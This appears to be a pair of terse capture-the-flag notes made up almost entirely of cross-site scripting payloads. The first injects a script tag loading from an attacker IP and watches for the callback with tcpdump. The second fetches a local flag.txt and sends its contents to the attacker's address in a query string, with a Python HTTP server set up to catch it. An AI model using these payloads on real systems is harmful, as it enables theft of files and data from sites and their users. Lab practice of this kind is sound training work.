# 1

<script src="http://10.8.136.212:8000/"></script>

```bash
sudo tcpdump -i tun0 port 8000
```

# 2

<script>
  fetch('http://127.0.0.1:8000/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));
    });
</script>

```bash
python3 -m http.server 8000
```
